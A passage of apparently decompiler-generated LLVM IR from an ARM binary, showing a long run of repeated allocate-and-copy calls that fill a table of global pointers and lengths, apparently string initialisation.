  %v3_11dcc = call i32 @function_12558(i32 %v1_11dbc, i32 ptrtoint (i32* @global_var_15a18.361 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1e8dc.362 to i8*), align 4
  %v0_11ddc = load i32, i32* @r5, align 4
  store i32 %v0_11ddc, i32* @global_var_1e8d8.363, align 4
  %v0_11de0 = load i32, i32* @r6, align 4
  %v1_11de0 = trunc i32 %v0_11de0 to i8
  store i8 %v1_11de0, i8* bitcast (i32* @global_var_1e8dd.364 to i8*), align 4
  %v1_11de4 = call i32 @function_13940(i32 4)
  store i32 %v1_11de4, i32* @r5, align 4
  %v4_11df4 = call i32 @function_12558(i32 %v1_11de4, i32 ptrtoint ([5 x i8]* @global_var_15a24.366 to i32), i32 4)
  %v0_11dfc = load i32, i32* @r7, align 4
  store i8 4, i8* bitcast (i32* @global_var_1e8e4.367 to i8*), align 4
  %v0_11e04 = load i32, i32* @r5, align 4
  store i32 %v0_11e04, i32* @global_var_1e8e0.368, align 4
  %v0_11e08 = load i32, i32* @r6, align 4
  %v1_11e08 = trunc i32 %v0_11e08 to i8
  store i8 %v1_11e08, i8* bitcast (i32* @global_var_1e8e5.369 to i8*), align 4
  %v1_11e0c = call i32 @function_13940(i32 %v0_11dfc)
  %v0_11e10 = load i32, i32* @r7, align 4
  store i32 %v1_11e0c, i32* @r5, align 4
  %v4_11e1c = call i32 @function_12558(i32 %v1_11e0c, i32 ptrtoint ([8 x i8]* @global_var_15a2c.371 to i32), i32 %v0_11e10)
  %v0_11e24 = load i32, i32* @r5, align 4
  store i32 %v0_11e24, i32* @global_var_1e8e8.372, align 4
  %v0_11e28 = load i32, i32* @r7, align 4
  %v1_11e28 = trunc i32 %v0_11e28 to i8
  store i8 %v1_11e28, i8* bitcast (i32* @global_var_1e8ec.373 to i8*), align 4
  %v0_11e2c = load i32, i32* @r6, align 4
  %v1_11e2c = trunc i32 %v0_11e2c to i8
  store i8 %v1_11e2c, i8* bitcast (i32* @global_var_1e8ed.374 to i8*), align 4
  %v1_11e30 = call i32 @function_13940(i32 8)
  store i32 %v1_11e30, i32* @r5, align 4
  %v4_11e40 = call i32 @function_12558(i32 %v1_11e30, i32 ptrtoint ([9 x i8]* @global_var_15a34.376 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1e8f4.377 to i8*), align 4
  %v0_11e50 = load i32, i32* @r5, align 4
  store i32 %v0_11e50, i32* @global_var_1e8f0.378, align 4
  %v0_11e54 = load i32, i32* @r6, align 4
  %v1_11e54 = trunc i32 %v0_11e54 to i8
  store i8 %v1_11e54, i8* bitcast (i32* @global_var_1e8f5.379 to i8*), align 4
  %v1_11e58 = call i32 @function_13940(i32 13)
  store i32 %v1_11e58, i32* @r5, align 4
  %v3_11e68 = call i32 @function_12558(i32 %v1_11e58, i32 ptrtoint (i32* @global_var_15a40.381 to i32), i32 13)
  store i8 13, i8* bitcast (i32* @global_var_1e8fc.382 to i8*), align 4
  %v0_11e78 = load i32, i32* @r5, align 4
  store i32 %v0_11e78, i32* @global_var_1e8f8.383, align 4
  %v0_11e7c = load i32, i32* @r6, align 4
  %v1_11e7c = trunc i32 %v0_11e7c to i8
  store i8 %v1_11e7c, i8* bitcast (i32* @global_var_1e8fd.384 to i8*), align 4
  %v1_11e80 = call i32 @function_13940(i32 10)
  store i32 10, i32* %r8.global-to-local, align 4
  store i32 %v1_11e80, i32* @r5, align 4
  %v4_11e94 = call i32 @function_12558(i32 %v1_11e80, i32 ptrtoint ([11 x i8]* @global_var_15a50.386 to i32), i32 10)
  %v0_11e9c = load i32, i32* @r5, align 4
  store i32 %v0_11e9c, i32* @global_var_1e900.387, align 4
  store i8 10, i8* bitcast (i32* @global_var_1e904.388 to i8*), align 4
  %v0_11ea4 = load i32, i32* @r6, align 4
  %v1_11ea4 = trunc i32 %v0_11ea4 to i8
  store i8 %v1_11ea4, i8* bitcast (i32* @global_var_1e905.389 to i8*), align 4
  %v1_11ea8 = call i32 @function_13940(i32 10)
  %v0_11eb0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_11ea8, i32* @r5, align 4
  %v4_11eb8 = call i32 @function_12558(i32 %v1_11ea8, i32 ptrtoint ([11 x i8]* @global_var_15a5c.391 to i32), i32 %v0_11eb0)
  %v0_11ec0 = load i32, i32* @r5, align 4
  store i32 %v0_11ec0, i32* @global_var_1e908.392, align 4
  %v1_11ec4 = trunc i32 %v0_11eb0 to i8
  store i8 %v1_11ec4, i8* bitcast (i32* @global_var_1e90c.393 to i8*), align 4
  %v0_11ec8 = load i32, i32* @r6, align 4
  %v1_11ec8 = trunc i32 %v0_11ec8 to i8
  store i8 %v1_11ec8, i8* bitcast (i32* @global_var_1e90d.394 to i8*), align 4
  %v1_11ecc = call i32 @function_13940(i32 33)
  store i32 %v1_11ecc, i32* @r5, align 4
  %v3_11edc = call i32 @function_12558(i32 %v1_11ecc, i32 ptrtoint (i32* @global_var_15a68.396 to i32), i32 33)
  store i8 33, i8* bitcast (i32* @global_var_1e914.397 to i8*), align 4
  %v0_11eec = load i32, i32* @r5, align 4
  store i32 %v0_11eec, i32* @global_var_1e910.398, align 4
  %v0_11ef0 = load i32, i32* @r6, align 4
  %v1_11ef0 = trunc i32 %v0_11ef0 to i8
  store i8 %v1_11ef0, i8* bitcast (i32* @global_var_1e915.399 to i8*), align 4
  %v1_11ef4 = call i32 @function_13940(i32 8)
  store i32 %v1_11ef4, i32* @r5, align 4
  %v4_11f04 = call i32 @function_12558(i32 %v1_11ef4, i32 ptrtoint ([9 x i8]* @global_var_15a8c.401 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1e91c.402 to i8*), align 4
  %v0_11f14 = load i32, i32* @r5, align 4
  store i32 %v0_11f14, i32* @global_var_1e918.403, align 4
  %v0_11f18 = load i32, i32* @r6, align 4
  %v1_11f18 = trunc i32 %v0_11f18 to i8
  store i8 %v1_11f18, i8* bitcast (i32* @global_var_1e91d.404 to i8*), align 4
  %v1_11f1c = call i32 @function_13940(i32 11)
  store i32 %v1_11f1c, i32* @r5, align 4
  %v4_11f2c = call i32 @function_12558(i32 %v1_11f1c, i32 ptrtoint ([12 x i8]* @global_var_15a98.406 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1e924.407 to i8*), align 4
  %v0_11f3c = load i32, i32* @r5, align 4
  store i32 %v0_11f3c, i32* @global_var_1e920.408, align 4
  %v0_11f40 = load i32, i32* @r6, align 4
  %v1_11f40 = trunc i32 %v0_11f40 to i8
  store i8 %v1_11f40, i8* bitcast (i32* @global_var_1e925.409 to i8*), align 4
  %v1_11f44 = call i32 @function_13940(i32 6)
  store i32 %v1_11f44, i32* @r5, align 4
  %v4_11f54 = call i32 @function_12558(i32 %v1_11f44, i32 ptrtoint ([7 x i8]* @global_var_15aa4.411 to i32), i32 6)
  %v0_11f5c = load i32, i32* @r7, align 4
  store i8 6, i8* bitcast (i32* @global_var_1e93c.412 to i8*), align 4
  %v0_11f64 = load i32, i32* @r5, align 4
  store i32 %v0_11f64, i32* @global_var_1e938.413, align 4
  %v0_11f68 = load i32, i32* @r6, align 4
  %v1_11f68 = trunc i32 %v0_11f68 to i8
  store i8 %v1_11f68, i8* bitcast (i32* @global_var_1e93d.414 to i8*), align 4
  %v1_11f6c = call i32 @function_13940(i32 %v0_11f5c)
  %v0_11f70 = load i32, i32* @r7, align 4
  store i32 %v1_11f6c, i32* @r5, align 4
  %v4_11f7c = call i32 @function_12558(i32 %v1_11f6c, i32 ptrtoint ([8 x i8]* @global_var_15aac.416 to i32), i32 %v0_11f70)
  %v0_11f80 = load i32, i32* @r7, align 4
  %v0_11f84 = load i32, i32* @r5, align 4
  store i32 %v0_11f84, i32* @global_var_1e940.417, align 4
  %v1_11f88 = trunc i32 %v0_11f80 to i8
  store i8 %v1_11f88, i8* bitcast (i32* @global_var_1e944.418 to i8*), align 4
  %v0_11f8c = load i32, i32* @r6, align 4
  %v1_11f8c = trunc i32 %v0_11f8c to i8
  store i8 %v1_11f8c, i8* bitcast (i32* @global_var_1e945.419 to i8*), align 4
  %v1_11f90 = call i32 @function_13940(i32 %v0_11f80)
  %v0_11f94 = load i32, i32* @r7, align 4
  store i32 %v1_11f90, i32* @r5, align 4
  %v4_11fa0 = call i32 @function_12558(i32 %v1_11f90, i32 ptrtoint ([8 x i8]* @global_var_15ab4.421 to i32), i32 %v0_11f94)
  %v0_11fa8 = load i32, i32* @r5, align 4
  store i32 %v0_11fa8, i32* @global_var_1e948.422, align 4
  %v0_11fac = load i32, i32* @r7, align 4
  %v1_11fac = trunc i32 %v0_11fac to i8
  store i8 %v1_11fac, i8* bitcast (i32* @global_var_1e94c.423 to i8*), align 4
  %v0_11fb0 = load i32, i32* @r6, align 4
  %v1_11fb0 = trunc i32 %v0_11fb0 to i8
  store i8 %v1_11fb0, i8* bitcast (i32* @global_var_1e94d.424 to i8*), align 4
  %v1_11fb4 = call i32 @function_13940(i32 3)
  store i32 %v1_11fb4, i32* @r5, align 4
  %v4_11fc4 = call i32 @function_12558(i32 %v1_11fb4, i32 ptrtoint ([4 x i8]* @global_var_15abc.426 to i32), i32 3)
  store i8 3, i8* bitcast (i32* @global_var_1e954.427 to i8*), align 4
  %v0_11fd4 = load i32, i32* @r5, align 4
  store i32 %v0_11fd4, i32* @global_var_1e950.428, align 4
  %v0_11fd8 = load i32, i32* @r6, align 4
  %v1_11fd8 = trunc i32 %v0_11fd8 to i8
  store i8 %v1_11fd8, i8* bitcast (i32* @global_var_1e955.429 to i8*), align 4
  %v1_11fdc = call i32 @function_13940(i32 19)
  store i32 %v1_11fdc, i32* @r5, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_11ff0 = call i32 @function_12558(i32 %v1_11fdc, i32 ptrtoint (i32* @global_var_15ac0.431 to i32), i32 19)
  %v0_11ff8 = load i32, i32* @r5, align 4
  store i32 %v0_11ff8, i32* @global_var_1e958.432, align 4
  store i8 19, i8* bitcast (i32* @global_var_1e95c.433 to i8*), align 4
  %v0_12000 = load i32, i32* @r6, align 4
  %v1_12000 = trunc i32 %v0_12000 to i8
  store i8 %v1_12000, i8* bitcast (i32* @global_var_1e95d.434 to i8*), align 4
  %v1_12004 = call i32 @function_13940(i32 24)
  store i32 %v1_12004, i32* @r5, align 4
  %v3_12014 = call i32 @function_12558(i32 %v1_12004, i32 ptrtoint (i32* @global_var_15ad4.436 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1e964.437 to i8*), align 4
  %v0_12024 = load i32, i32* @r5, align 4
  store i32 %v0_12024, i32* @global_var_1e960.438, align 4
  %v0_12028 = load i32, i32* @r6, align 4
  %v1_12028 = trunc i32 %v0_12028 to i8
  store i8 %v1_12028, i8* bitcast (i32* @global_var_1e965.439 to i8*), align 4
  %v1_1202c = call i32 @function_13940(i32 9)
  store i32 %v1_1202c, i32* @r5, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  %v4_12040 = call i32 @function_12558(i32 %v1_1202c, i32 ptrtoint ([10 x i8]* @global_var_15af0.441 to i32), i32 9)
  %v0_12048 = load i32, i32* @r5, align 4
  store i32 %v0_12048, i32* @global_var_1e968.442, align 4
  store i8 9, i8* bitcast (i32* @global_var_1e96c.443 to i8*), align 4
  %v0_12050 = load i32, i32* @r6, align 4
  %v1_12050 = trunc i32 %v0_12050 to i8
  store i8 %v1_12050, i8* bitcast (i32* @global_var_1e96d.444 to i8*), align 4
  %v1_12054 = call i32 @function_13940(i32 16)
  store i32 %v1_12054, i32* @r5, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_12068 = call i32 @function_12558(i32 %v1_12054, i32 ptrtoint (i32* @global_var_15afc.446 to i32), i32 16)
  %v0_12070 = load i32, i32* @r5, align 4
  store i32 %v0_12070, i32* @global_var_1e970.447, align 4
  store i8 16, i8* bitcast (i32* @global_var_1e974.448 to i8*), align 4
  %v0_12078 = load i32, i32* @r6, align 4
  %v1_12078 = trunc i32 %v0_12078 to i8
  store i8 %v1_12078, i8* bitcast (i32* @global_var_1e975.449 to i8*), align 4
  %v1_1207c = call i32 @function_13940(i32 22)
  store i32 %v1_1207c, i32* @r5, align 4
  %v3_1208c = call i32 @function_12558(i32 %v1_1207c, i32 ptrtoint (i32* @global_var_15b10.451 to i32), i32 22)
  store i8 22, i8* bitcast (i32* @global_var_1e97c.452 to i8*), align 4
  %v0_1209c = load i32, i32* @r5, align 4
  store i32 %v0_1209c, i32* @global_var_1e978.453, align 4
  %v0_120a0 = load i32, i32* @r6, align 4
  %v1_120a0 = trunc i32 %v0_120a0 to i8
  store i8 %v1_120a0, i8* bitcast (i32* @global_var_1e97d.454 to i8*), align 4
  %v1_120a4 = call i32 @function_13940(i32 21)
  store i32 %v1_120a4, i32* @r5, align 4
  %v3_120b4 = call i32 @function_12558(i32 %v1_120a4, i32 ptrtoint (i32* @global_var_15b28.456 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1e984.457 to i8*), align 4
  %v0_120c4 = load i32, i32* @r5, align 4
  store i32 %v0_120c4, i32* @global_var_1e980.458, align 4
  %v0_120c8 = load i32, i32* @r6, align 4
  %v1_120c8 = trunc i32 %v0_120c8 to i8
  store i8 %v1_120c8, i8* bitcast (i32* @global_var_1e985.459 to i8*), align 4
  %v1_120cc = call i32 @function_13940(i32 17)
  store i32 %v1_120cc, i32* @r5, align 4
  %v4_120dc = call i32 @function_12558(i32 %v1_120cc, i32 ptrtoint ([18 x i8]* @global_var_15b40.461 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1e98c.462 to i8*), align 4
  %v0_120ec = load i32, i32* @r5, align 4
  store i32 %v0_120ec, i32* @global_var_1e988.463, align 4
  %v0_120f0 = load i32, i32* @r6, align 4
  %v1_120f0 = trunc i32 %v0_120f0 to i8
  store i8 %v1_120f0, i8* bitcast (i32* @global_var_1e98d.464 to i8*), align 4
  %v1_120f4 = call i32 @function_13940(i32 12)
  %v0_12100 = load i32, i32* @r7, align 4
  %v1_12100 = add i32 %v0_12100, 5
  store i32 %v1_12100, i32* @r7, align 4
  store i32 %v1_120f4, i32* @r5, align 4
  %v3_12108 = call i32 @function_12558(i32 %v1_120f4, i32 ptrtoint (i32* @global_var_15b54.466 to i32), i32 12)
  %v0_12110 = load i32, i32* @r5, align 4
  store i32 %v0_12110, i32* @global_var_1e990.467, align 4
  %v0_12114 = load i32, i32* @r7, align 4
  %v1_12114 = trunc i32 %v0_12114 to i8
  store i8 %v1_12114, i8* bitcast (i32* @global_var_1e994.468 to i8*), align 4
  %v0_12118 = load i32, i32* @r6, align 4
  %v1_12118 = trunc i32 %v0_12118 to i8
  store i8 %v1_12118, i8* bitcast (i32* @global_var_1e995.469 to i8*), align 4
  %v1_1211c = call i32 @function_13940(i32 23)
  store i32 %v1_1211c, i32* @r5, align 4
  %v3_1212c = call i32 @function_12558(i32 %v1_1211c, i32 ptrtoint (i32* @global_var_15b64.471 to i32), i32 23)
  store i8 23, i8* bitcast (i32* @global_var_1e99c.472 to i8*), align 4
  %v0_1213c = load i32, i32* @r5, align 4
  store i32 %v0_1213c, i32* @global_var_1e998.473, align 4
  %v0_12140 = load i32, i32* @r6, align 4
  %v1_12140 = trunc i32 %v0_12140 to i8
  store i8 %v1_12140, i8* bitcast (i32* @global_var_1e99d.474 to i8*), align 4
  %v1_12144 = call i32 @function_13940(i32 83)
  store i32 %v1_12144, i32* @r5, align 4
  %v3_12154 = call i32 @function_12558(i32 %v1_12144, i32 ptrtoint (i32* @global_var_15b7c.476 to i32), i32 83)
  store i8 83, i8* bitcast (i32* @global_var_1e9a4.477 to i8*), align 4
  %v0_12164 = load i32, i32* @r5, align 4
  store i32 %v0_12164, i32* @global_var_1e9a0.478, align 4
  %v0_12168 = load i32, i32* @r6, align 4
  %v1_12168 = trunc i32 %v0_12168 to i8
  store i8 %v1_12168, i8* bitcast (i32* @global_var_1e9a5.479 to i8*), align 4
  %v1_1216c = call i32 @function_13940(i32 32)
  store i32 %v1_1216c, i32* @r5, align 4
  %v3_1217c = call i32 @function_12558(i32 %v1_1216c, i32 ptrtoint (i32* @global_var_15bd0.481 to i32), i32 32)
  store i8 32, i8* bitcast (i32* @global_var_1e9ac.482 to i8*), align 4
  %v0_1218c = load i32, i32* @r5, align 4
  store i32 %v0_1218c, i32* @global_var_1e9a8.483, align 4
  %v0_12190 = load i32, i32* @r6, align 4
  %v1_12190 = trunc i32 %v0_12190 to i8
  store i8 %v1_12190, i8* bitcast (i32* @global_var_1e9ad.484 to i8*), align 4
  %v1_12194 = call i32 @function_13940(i32 48)
  store i32 %v1_12194, i32* @r5, align 4
  %v3_121a4 = call i32 @function_12558(i32 %v1_12194, i32 ptrtoint (i32* @global_var_15bf4.486 to i32), i32 48)
  %v0_121ac = load i32, i32* @r7, align 4
  store i8 48, i8* bitcast (i32* @global_var_1e9b4.487 to i8*), align 4
  %v0_121b4 = load i32, i32* @r5, align 4
  store i32 %v0_121b4, i32* @global_var_1e9b0.488, align 4
  %v0_121b8 = load i32, i32* @r6, align 4
  %v1_121b8 = trunc i32 %v0_121b8 to i8
  store i8 %v1_121b8, i8* bitcast (i32* @global_var_1e9b5.489 to i8*), align 4
  %v1_121bc = call i32 @function_13940(i32 %v0_121ac)
  %v0_121c0 = load i32, i32* @r7, align 4
  store i32 %v1_121bc, i32* @r5, align 4
  %v3_121cc = call i32 @function_12558(i32 %v1_121bc, i32 ptrtoint (i32* @global_var_15c28.491 to i32), i32 %v0_121c0)
  %v0_121d0 = load i32, i32* %sl.global-to-local, align 4
  %v0_121d4 = load i32, i32* @r5, align 4
  store i32 %v0_121d4, i32* @global_var_1e9b8.492, align 4
  %v0_121d8 = load i32, i32* @r7, align 4
  %v1_121d8 = trunc i32 %v0_121d8 to i8
  store i8 %v1_121d8, i8* bitcast (i32* @global_var_1e9bc.493 to i8*), align 4
  %v0_121dc = load i32, i32* @r6, align 4
  %v1_121dc = trunc i32 %v0_121dc to i8
  store i8 %v1_121dc, i8* bitcast (i32* @global_var_1e9bd.494 to i8*), align 4
  %v1_121e0 = call i32 @function_13940(i32 %v0_121d0)
  %v0_121e8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_121e0, i32* @r5, align 4
  %v3_121f0 = call i32 @function_12558(i32 %v1_121e0, i32 ptrtoint (i32* @global_var_15c38.496 to i32), i32 %v0_121e8)
  %v0_121f4 = load i32, i32* %r8.global-to-local, align 4
  %v0_121f8 = load i32, i32* @r5, align 4
  store i32 %v0_121f8, i32* @global_var_1e9c0.497, align 4
  %v1_121fc = trunc i32 %v0_121e8 to i8
  store i8 %v1_121fc, i8* bitcast (i32* @global_var_1e9c4.498 to i8*), align 4
  %v0_12200 = load i32, i32* @r6, align 4
  %v1_12200 = trunc i32 %v0_12200 to i8
  store i8 %v1_12200, i8* bitcast (i32* @global_var_1e9c5.499 to i8*), align 4
  %v1_12204 = call i32 @function_13940(i32 %v0_121f4)
  %v0_1220c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_12204, i32* @r5, align 4
  %v3_12214 = call i32 @function_12558(i32 %v1_12204, i32 ptrtoint (i32* @global_var_15c44.501 to i32), i32 %v0_1220c)
  %v0_12218 = load i32, i32* @r7, align 4
  %v0_1221c = load i32, i32* @r5, align 4
  store i32 %v0_1221c, i32* @global_var_1e9c8.502, align 4
  %v1_12220 = trunc i32 %v0_1220c to i8
  store i8 %v1_12220, i8* bitcast (i32* @global_var_1e9cc.503 to i8*), align 4
  %v0_12224 = load i32, i32* @r6, align 4
  %v1_12224 = trunc i32 %v0_12224 to i8
  store i8 %v1_12224, i8* bitcast (i32* @global_var_1e9cd.504 to i8*), align 4
  %v1_12228 = call i32 @function_13940(i32 %v0_12218)
  %v0_1222c = load i32, i32* @r7, align 4
  store i32 %v1_12228, i32* @r5, align 4
  %v3_12238 = call i32 @function_12558(i32 %v1_12228, i32 ptrtoint (i32* @global_var_15c50.506 to i32), i32 %v0_1222c)
  %v0_1223c = load i32, i32* %fp.global-to-local, align 4
  %v0_12240 = load i32, i32* @r5, align 4
  store i32 %v0_12240, i32* @global_var_1e9d0.507, align 4
  %v0_12244 = load i32, i32* @r7, align 4
  %v1_12244 = trunc i32 %v0_12244 to i8
  store i8 %v1_12244, i8* bitcast (i32* @global_var_1e9d4.508 to i8*), align 4
  %v0_12248 = load i32, i32* @r6, align 4
  %v1_12248 = trunc i32 %v0_12248 to i8
  store i8 %v1_12248, i8* bitcast (i32* @global_var_1e9d5.509 to i8*), align 4
  %v1_1224c = call i32 @function_13940(i32 %v0_1223c)
  %v0_12254 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1224c, i32* @r5, align 4
  %v3_1225c = call i32 @function_12558(i32 %v1_1224c, i32 ptrtoint (i32* @global_var_15c60.511 to i32), i32 %v0_12254)
  %v0_12260 = load i32, i32* %sb.global-to-local, align 4
  %v0_12264 = load i32, i32* @r5, align 4
  store i32 %v0_12264, i32* @global_var_1e9d8.512, align 4
  %v1_12268 = trunc i32 %v0_12254 to i8
  store i8 %v1_12268, i8* bitcast (i32* @global_var_1e9dc.513 to i8*), align 4
  %v0_1226c = load i32, i32* @r6, align 4
  %v1_1226c = trunc i32 %v0_1226c to i8
  store i8 %v1_1226c, i8* bitcast (i32* @global_var_1e9dd.514 to i8*), align 4
  %v1_12270 = call i32 @function_13940(i32 %v0_12260)
  %v0_12278 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_12270, i32* @r5, align 4
  %v3_12280 = call i32 @function_12558(i32 %v1_12270, i32 ptrtoint (i32* @global_var_15c74.516 to i32), i32 %v0_12278)
  %v0_12288 = load i32, i32* @r5, align 4
  store i32 %v0_12288, i32* @global_var_1e9e0.517, align 4
  %v1_1228c = trunc i32 %v0_12278 to i8
  store i8 %v1_1228c, i8* bitcast (i32* @global_var_1e9e4.518 to i8*), align 4
  %v0_12290 = load i32, i32* @r6, align 4
  %v1_12290 = trunc i32 %v0_12290 to i8
  store i8 %v1_12290, i8* bitcast (i32* @global_var_1e9e5.519 to i8*), align 4
  %v1_12294 = call i32 @function_13940(i32 8)
  store i32 %v1_12294, i32* @r5, align 4
  %v4_122a4 = call i32 @function_12558(i32 %v1_12294, i32 ptrtoint ([9 x i8]* @global_var_15c88.521 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1e9ec.522 to i8*), align 4
  %v0_122b4 = load i32, i32* @r5, align 4
  store i32 %v0_122b4, i32* @global_var_1e9e8.523, align 4
  %v0_122b8 = load i32, i32* @r6, align 4
  %v1_122b8 = trunc i32 %v0_122b8 to i8
  store i8 %v1_122b8, i8* bitcast (i32* @global_var_1e9ed.524 to i8*), align 4
  %v1_122bc = call i32 @function_13940(i32 11)
  store i32 %v1_122bc, i32* @r5, align 4
  %v3_122cc = call i32 @function_12558(i32 %v1_122bc, i32 ptrtoint (i32* @global_var_15b70.526 to i32), i32 11)
  %v0_122d4 = load i32, i32* @r7, align 4
  store i8 11, i8* bitcast (i32* @global_var_1e9f4.527 to i8*), align 4
  %v0_122dc = load i32, i32* @r5, align 4
  store i32 %v0_122dc, i32* @global_var_1e9f0.528, align 4
  %v0_122e0 = load i32, i32* @r6, align 4
  %v1_122e0 = trunc i32 %v0_122e0 to i8
  store i8 %v1_122e0, i8* bitcast (i32* @global_var_1e9f5.529 to i8*), align 4
  %v1_122e4 = call i32 @function_13940(i32 %v0_122d4)
  %v0_122e8 = load i32, i32* @r7, align 4
  store i32 %v1_122e4, i32* @r5, align 4
  %v3_122f4 = call i32 @function_12558(i32 %v1_122e4, i32 ptrtoint (i32* @global_var_15c94.531 to i32), i32 %v0_122e8)
  %v0_122fc = load i32, i32* @r5, align 4
  store i32 %v0_122fc, i32* @global_var_1e9f8.532, align 4
  %v0_12300 = load i32, i32* @r7, align 4
  %v1_12300 = trunc i32 %v0_12300 to i8
  store i8 %v1_12300, i8* bitcast (i32* @global_var_1e9fc.533 to i8*), align 4
  %v0_12304 = load i32, i32* @r6, align 4
  %v1_12304 = trunc i32 %v0_12304 to i8
  store i8 %v1_12304, i8* bitcast (i32* @global_var_1e9fd.534 to i8*), align 4
  %v1_12308 = call i32 @function_13940(i32 18)
  store i32 %v1_12308, i32* @r5, align 4
  %v3_12318 = call i32 @function_12558(i32 %v1_12308, i32 ptrtoint (i32* @global_var_15ca4.536 to i32), i32 18)
  store i8 18, i8* bitcast (i32* @global_var_1ea04.537 to i8*), align 4
  %v0_12328 = load i32, i32* @r5, align 4
  store i32 %v0_12328, i32* @global_var_1ea00.538, align 4
  %v0_1232c = load i32, i32* @r6, align 4
  %v1_1232c = trunc i32 %v0_1232c to i8
  store i8 %v1_1232c, i8* bitcast (i32* @global_var_1ea05.539 to i8*), align 4
  %v1_12330 = call i32 @function_13940(i32 25)
  store i32 %v1_12330, i32* @r5, align 4
  %v3_12340 = call i32 @function_12558(i32 %v1_12330, i32 ptrtoint (i32* @global_var_15cb8.541 to i32), i32 25)
  store i8 25, i8* bitcast (i32* @global_var_1ea0c.542 to i8*), align 4
  %v0_12350 = load i32, i32* @r5, align 4
  store i32 %v0_12350, i32* @global_var_1ea08.543, align 4
  %v0_12354 = load i32, i32* @r6, align 4
  %v1_12354 = trunc i32 %v0_12354 to i8
  store i8 %v1_12354, i8* bitcast (i32* @global_var_1ea0d.544 to i8*), align 4
  %v1_12358 = call i32 @function_13940(i32 111)
  store i32 111, i32* @r5, align 4
  store i32 %v1_12358, i32* @r7, align 4
  %v3_1236c = call i32 @function_12558(i32 %v1_12358, i32 ptrtoint (i32* @global_var_15cd4.546 to i32), i32 111)
  %v0_12370 = load i32, i32* @r5, align 4
  %v0_12374 = load i32, i32* @r7, align 4
  store i32 %v0_12374, i32* @global_var_1ea10.547, align 4
  %v1_12378 = trunc i32 %v0_12370 to i8
  store i8 %v1_12378, i8* bitcast (i32* @global_var_1ea14.548 to i8*), align 4
  %v0_1237c = load i32, i32* @r6, align 4
  %v1_1237c = trunc i32 %v0_1237c to i8
  store i8 %v1_1237c, i8* bitcast (i32* @global_var_1ea15.549 to i8*), align 4
  %v1_12380 = call i32 @function_13940(i32 %v0_12370)
  %v0_12384 = load i32, i32* @r5, align 4
  store i32 %v1_12380, i32* @r7, align 4
  %v3_12390 = call i32 @function_12558(i32 %v1_12380, i32 ptrtoint (i32* @global_var_15d44.551 to i32), i32 %v0_12384)
  %v0_12398 = load i32, i32* @r7, align 4
  store i32 %v0_12398, i32* @global_var_1ea18.552, align 4
  %v0_1239c = load i32, i32* @r5, align 4
  %v1_1239c = trunc i32 %v0_1239c to i8
  store i8 %v1_1239c, i8* bitcast (i32* @global_var_1ea1c.553 to i8*), align 4
  %v0_123a0 = load i32, i32* @r6, align 4
  %v1_123a0 = trunc i32 %v0_123a0 to i8
  store i8 %v1_123a0, i8* bitcast (i32* @global_var_1ea1d.554 to i8*), align 4
  %v1_123a4 = call i32 @function_13940(i32 110)
  %v0_123a8 = load i32, i32* @r5, align 4
  %v1_123a8 = add i32 %v0_123a8, -1
  store i32 %v1_123a8, i32* @r5, align 4
  store i32 %v1_123a4, i32* @r7, align 4
  %v3_123b8 = call i32 @function_12558(i32 %v1_123a4, i32 ptrtoint (i32* @global_var_15db4.556 to i32), i32 %v1_123a8)
  %v0_123bc = load i32, i32* @r5, align 4
  %v0_123c0 = load i32, i32* @r7, align 4
  store i32 %v0_123c0, i32* @global_var_1ea20.557, align 4
  %v1_123c4 = trunc i32 %v0_123bc to i8
  store i8 %v1_123c4, i8* bitcast (i32* @global_var_1ea24.558 to i8*), align 4
  %v0_123c8 = load i32, i32* @r6, align 4
  %v1_123c8 = trunc i32 %v0_123c8 to i8
  store i8 %v1_123c8, i8* bitcast (i32* @global_var_1ea25.559 to i8*), align 4
  %v1_123cc = call i32 @function_13940(i32 %v0_123bc)
  %v0_123d0 = load i32, i32* @r5, align 4
  store i32 %v1_123cc, i32* @r7, align 4
  %v3_123dc = call i32 @function_12558(i32 %v1_123cc, i32 ptrtoint (i32* @global_var_15e24.561 to i32), i32 %v0_123d0)
  %v0_123e4 = load i32, i32* @r5, align 4
  %v1_123e4 = trunc i32 %v0_123e4 to i8
  store i8 %v1_123e4, i8* bitcast (i32* @global_var_1ea2c.562 to i8*), align 4
  %v0_123e8 = load i32, i32* @r7, align 4
  store i32 %v0_123e8, i32* @global_var_1ea28.563, align 4
  %v0_123ec = load i32, i32* @r6, align 4
  %v1_123ec = trunc i32 %v0_123ec to i8
  store i8 %v1_123ec, i8* bitcast (i32* @global_var_1ea2d.564 to i8*), align 4
  %v1_123f0 = call i32 @function_13940(i32 117)
  %v3_12400 = call i32 @function_12558(i32 %v1_123f0, i32 ptrtoint (i32* @global_var_15e94.566 to i32), i32 117)
  %v0_12408 = load i32, i32* @r6, align 4
  %v1_12408 = trunc i32 %v0_12408 to i8
  store i8 %v1_12408, i8* bitcast (i32* @global_var_1ea35.567 to i8*), align 4
  store i32 %v1_123f0, i32* @global_var_1ea30.568, align 4
  store i8 117, i8* bitcast (i32* @global_var_1ea34.569 to i8*), align 4
  ret i32 %v3_12400

; uselistorder directives
  uselistorder i32 %v1_123cc, { 1, 0 }
  uselistorder i32 %v1_123a4, { 1, 0 }
  uselistorder i32 %v1_12380, { 1, 0 }
  uselistorder i32 %v1_12358, { 1, 0 }
  uselistorder i32 %v1_122e4, { 1, 0 }
  uselistorder i32 %v1_12270, { 1, 0 }
  uselistorder i32 %v1_1224c, { 1, 0 }
  uselistorder i32 %v1_12228, { 1, 0 }
  uselistorder i32 %v1_12204, { 1, 0 }
  uselistorder i32 %v1_121e0, { 1, 0 }
  uselistorder i32 %v1_121bc, { 1, 0 }
  uselistorder i32 %v1_120f4, { 1, 0 }
